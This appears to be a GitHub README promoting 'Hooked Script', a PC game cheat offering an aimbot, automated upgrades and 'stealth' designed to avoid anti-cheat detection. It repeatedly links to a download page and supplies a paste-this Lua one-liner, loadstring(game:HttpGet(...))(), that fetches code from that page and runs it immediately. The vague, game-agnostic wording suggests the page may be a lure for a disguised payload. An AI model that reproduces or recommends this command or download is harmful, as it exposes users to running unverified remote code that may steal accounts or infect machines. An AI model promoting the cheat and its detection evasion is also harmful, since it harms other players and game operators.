# Hooked Script v2.0 - Game Script Utility 2026

> **A PC-oriented game script built to boost gameplay with assisted aiming and progression automation.** Tuned for speed and stealth-minded integration.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-PC-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/hayesbrandon61/hooked-windows-script-update?style=flat-square)](https://github.com/hayesbrandon61/hooked-windows-script-update)

---

<p align="center">
  <a href="https://hayesbrandon61.github.io/hooked-windows-script-update/">
    <img src="https://img.shields.io/badge/Download-Hooked%20Script-brightgreen?style=for-the-badge" alt="Download Hooked Script">
  </a>
</p>

> **[Direct Download - Hooked Script](https://hayesbrandon61.github.io/hooked-windows-script-update/)**

---

[Download Latest Build](https://hayesbrandon61.github.io/hooked-windows-script-update/)

---

## What It Does

Hooked Script is a compact automation utility for PC players who want more consistent aim control and less time spent on repetitive progression tasks. It hooks into supported titles to deliver live aim correction alongside automated upgrade handling, cutting down on manual actions during play. The script is built to stay light on resources while still behaving reliably in a wide range of gameplay situations.

This release brings updated aimbot behavior for smoother target following and a more capable auto-upgrade flow that keeps pace with changing game mechanics. Ongoing revisions help keep the script aligned with current patches, and the low-footprint design is intended to minimize exposure to anti-cheat detection. If your goal is to tighten aim or automate grind-heavy upgrade loops, Hooked Script provides a practical option for committed players.

---

## Core Features

- **Aimbot Module:** Delivers tunable target acquisition and tracking, with options for sensitivity and lock-on response.
- **Auto-Upgrade System:** Handles skill, weapon, or gear upgrades automatically using configurable priority logic.
- **Stealth Integration:** Built to run with low system disturbance and fewer signature-like patterns.
- **Real-Time Configuration:** Update script settings during gameplay without restarting the game or the script.
- **Hotkey Support:** Set custom keybinds to switch features, change modes, or stop automation.
- **Performance Optimized:** A lightweight codebase that uses minimal CPU and memory while active.
- **Update-Ready Architecture:** Modular design makes it easier to adapt to game updates and added functionality.

---

## Setup

1. **Download** the latest script package from the [download page](https://hayesbrandon61.github.io/hooked-windows-script-update/).
2. **Extract** the contents to a dedicated folder, e.g., `hooked-gx92`.
3. **Launch** your target game and ensure it runs in windowed or borderless mode for best compatibility.
4. **Run** the script using your preferred executor or loader (see compatibility notes below).
5. **Configure** hotkeys and options using the integrated settings panel or the configuration file.

Minimal example for loading the script:
```lua
loadstring(game:HttpGet("https://hayesbrandon61.github.io/hooked-windows-script-update/"))()
```

---

## Options

| Setting | Default | Description |
|---------|---------|-------------|
| Aimbot Enabled | true | Toggle aim assistance on/off |
| Aimbot Smoothness | 50 | Adjust tracking smoothness (0-100) |
| Auto-Upgrade | false | Enable automatic upgrade processing |
| Upgrade Priority | "weapon" | Set upgrade target (weapon, skill, gear) |
| Hotkey Toggle | "F1" | Key to enable/disable all script features |
| Hotkey Pause | "F2" | Key to pause script execution |

---

## Compatibility

- **Platform:** PC (Windows 10/11 recommended)
- **Supported Games:** Works with most modern titles that use standard scripting interfaces; primary targets include popular FPS and RPG games with upgrade systems.
- **Known Limitations:** May require updates following major game patches. Performance may vary on lower-end hardware. Some anti-cheat implementations may block script execution entirely.

---

## FAQ

**Q: How do I install Hooked Script?**  
A: Grab the package, unpack it into a folder, and launch it through a compatible loader before starting your game.

**Q: Will the script work after game updates?**  
A: Compatibility updates are released from time to time. Check the download page for the newest version.

**Q: Can I customize the hotkeys?**  
A: Yes, hotkeys can be changed in the configuration file or through the in-script settings panel.

**Q: Is this script compatible with all games?**  
A: It is intended for games that support external scripting. Compatibility differs by title, and some games may block or restrict script usage.

**Q: Where are the script settings saved?**  
A: Settings are kept in a local configuration file inside the script folder, so your preferences persist between sessions.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
